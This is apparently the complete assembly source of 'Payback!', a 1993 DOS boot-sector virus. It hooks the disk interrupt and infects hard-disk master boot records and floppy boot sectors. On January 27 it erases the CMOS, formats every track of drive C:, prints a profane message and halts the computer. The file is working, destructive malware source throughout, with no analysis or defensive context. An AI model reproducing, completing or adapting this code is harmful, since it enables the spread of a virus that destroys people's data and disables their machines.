

.model  tiny
.code


marker          equ     12cdh

activate_date   equ     0127h                   ; Jan. 27th


payback:        cli
                xor     ax,ax
                mov     ds,ax
                mov     ss,ax                   ; set up segments
                mov     sp,-2h                  ; and stack
                sti
                push    ds                      ; save segment pointer
                dec     word ptr ds:[413h]      ; minus 1 k of memory
get_mem         dw      12cdh                   ; get amount of memory
                mov     cl,0ah
                ror     ax,cl                   ; convert to segment address
                les     bx,ds:[13h*4h]          ; get address of int 13h
                mov     word ptr ds:[int_13+7c00h],bx    ; save address
                mov     word ptr ds:[int_13+7c02h],es
                mov     word ptr ds:[13h*4h],offset new_13
                mov     ds:[(13h*4h)+2],ax      ; point int 13h to us
                mov     es,ax                   ; copy to high segment
                xor     di,di
                mov     si,7c00h                ; from DS:7c00h
                push    si                      ; save ptr to 0:7c00h
                mov     cx,offset payback_end-offset payback ; size of virus
                cld
                rep     movsb
                push    es
                mov     ax,offset high_code     ; where to jump
                push    ax
                retf

high_code:      mov     ax,201h
                pop     bx                      ; restore ptr to 0:7c00h
                db      0b9h                    ; mov cx,
host_cx         dw      0002h
                db      0bah
host_dx         dw      0080h
                and     dl,80h                  ; drive C: or A:
                pop     es    
                call    call_13                 ; read original boot sector
                push    cs
                pop     ds
                push    cs
                pop     es
                mov     ax,201h                 ; read sector
                mov     bx,offset buffer
                mov     cx,1
                mov     dx,80h
                call    call_13                 ; read partition table
                cmp     ds:[buffer+(get_mem-payback)],marker  ; infected?
                je      infect_hard_no
                cmp     ds:buffer+510,0aa55h    ; valid part table?
                jne     infect_hard_no
                mov     ax,302h                 ; write two sectors
                xor     bx,bx
                inc     cx
                mov     ds:host_cx,cx           ; save ptr to original boot
                mov     ds:host_dx,dx
                dec     cx
                call    call_13
infect_hard_no: call    activate                ; if activate_date, destroy
                db      0eah
                dd      00007c00h               ; jmp 0:7c00h

                
new_13:         cmp     cx,1h                   ; sector 1?
                jne     new_13_jump
                or      dh,dh                   ; head 0?
                jne     new_13_jump
                cmp     ah,2h                   ; read?
                je      check
new_13_jump:    jmp     cs:int_13
                
new_13_ret:     retf    2h

check:          call    call_13
                jb      new_13_ret
                cmp     word ptr es:[bx+get_mem],marker ; infected?
                jne     infect
                mov     ax,201h                 ; read one sector
                push    cx dx                   ; save parameters
                mov     cx,es:[bx+host_cx]            ; get sector of boot
                mov     dh,byte ptr es:[bx+host_dx+1] ; get head of boot
                call    call_13                 ; read old boot
                pop     dx cx
                jmp     short new_13_ret

infect:         pushf
                push    ax bx cx dx di es cx dx bx
                test    dl,80h                  ; hard disk?
                jne     infect_error
                cmp     es:[bx+510],0aa55h      ; valid boot sector?
                jne     infect_error
                call    get_last_sector
                jb      infect_error
                mov     cs:host_cx,cx           ; save pointer to boot
                mov     cs:host_dx,dx
                pop     bx                      ; ptr to boot in memory
                mov     ax,301h
                push    ax
                call    call_13                 ; write boot sector
                pop     ax dx cx
                jb      infect_error1
                xor     bx,bx
                push    cs
                pop     es
                call    call_13
                jmp     short infect_error1
infect_error:   pop     bx
                pop     dx
                pop     cx
infect_error1:  pop     es di dx cx bx ax
                popf
                jmp     new_13_ret
                

get_last_sector:mov     di,dx                   ; save drive
                mov     ax,es:[bx.bs_sectors]   ; get number of sectors
                mov     cx,es:[bx.bs_sectors_per_track]
                or      ax,ax
                je      get_last_err
                jcxz    get_last_err
                xor     dx,dx
                div     cx                      ; number of tracks
                or      dx,dx                   ; even division?
                jne     get_last_err
                mov     bx,es:[bx.bs_heads]     ; number of heads
                or      bx,bx
                je      get_last_err
                div     bx                      ; divide further
                or      dx,dx                   ; even division?
                jne     get_last_err
                dec     al                      ; zero based
                mov     ch,al                   ; track into CH
                dec     bl                      ; zero based
                mov     dx,di                   ; get drive
                mov     dh,bl                   ; head into DH
                clc
                retn
get_last_err:   stc
                retn


call_13:        pushf
                call    cs:int_13
                retn


activate:       mov     ah,4h
                int     1ah                     ; get date
                cmp     dx,activate_date        ; time to destroy?
                je      destroy
                retn

destroy:        mov     cx,00ffh
cmos_loop:      mov     dx,70h                  ; offset into CMOS
                mov     al,cl              
                out     dx,al
                jmp     short $+2
                inc     dx                      ; port 71h
                xor     al,al                   ; send zero to cmos
                out     dx,al                   ; zero it out
                loop    cmos_loop
                
                mov     di,ds:buffer.pt_end_sector_track
                and     di,1111111111000000b
                mov     cl,6h
                shr     di,cl                   ; DI = last track
                mov     al,ds:buffer.pt_end_head  ; get last head
                xor     ah,ah
                xchg    ax,bp                   ; save in BP
                
                mov     bx,offset zeros
                mov     dx,0080h                ; head 0, drive c:
disk_loop1:     xor     cx,cx
disk_loop:      mov     ax,501h                 ; format disk
                call    call_13

                and     cl,11000000b
                rol     cl,1
                rol     cl,1
                xchg    cl,ch                   ; convert to 10 bit digit
                inc     cx                      ; next track
                cmp     cx,di                   ; reached last track?
                ja      disk_next
                xchg    cl,ch
                ror     cl,1
                ror     cl,1
                jmp     short disk_loop         ; loop

disk_next:      inc     dh                      ; next head
                mov     ax,bp                   ; last head into AX
                cmp     dh,al                   ; 'nuff?
                jbe     disk_loop1

                mov     si,offset payback_mes
disp_loop:      cld              
                lodsb
                or      al,al                   ; done?
                je      disp_end
                mov     ah,0eh                  ; dispay character
                xor     bx,bx
                int     10h
                jmp     short disp_loop

disp_end:       cli
                hlt                             ; crash the computer

int_13          dd      ?

payback_mes:    db      0ah,0dh,'That was for ARCV, mother fucker!',0ah,0ah,0dh
                db      'Payback! (c) 1993',0ah,0dh,0h

zeros:          db      ((offset payback+200h)-offset $)-2 dup(0)
                dw      0aa55h

buffer          dw      100 dup(?)


payback_end:

               
Boot_Sector             STRUC
bs_Jump                 db 3 dup(?)
bs_Oem_Name             db 8 dup(?)
bs_Bytes_Per_Sector     dw ?
bs_Sectors_Per_Cluster  db ?
bs_Reserved_Sectors     dw ?               
bs_FATs                 db ?             ; Number of FATs
bs_Root_Dir_Entries     dw ?             ; Max number of root dir entries
bs_Sectors              dw ?             ; number of sectors; small
bs_Media                db ?             ; Media descriptor byte
bs_Sectors_Per_FAT      dw ?
bs_Sectors_Per_Track    dw ?               
bs_Heads                dw ?             ; number of heads
bs_Hidden_Sectors       dd ?
bs_Huge_Sectors         dd ?             ; number of sectors; large
bs_Drive_Number         db ?
bs_Reserved             db ?
bs_Boot_Signature       db ?
bs_Volume_ID            dd ?
bs_Volume_Label         db 11 dup(?)
bs_File_System_Type     db 8 dup(?)
Boot_Sector             ENDS
                
                
Partition_Table         STRUC
pt_Code                 db 1beh dup(?)  ;partition table code
pt_Status               db ?            ;0=non-bootable 80h=bootable
pt_Start_Head           db ?            
pt_Start_Sector_Track   dw ?
pt_Type                 db ?            ;1 = DOS 12bit FAT 4 = DOS 16bit FAT
pt_End_Head             db ?
pt_End_Sector_Track     dw ?
pt_Starting_Abs_Sector  dd ?
pt_Number_Sectors       dd ?
Partition_Table         ENDS
                
                end     payback








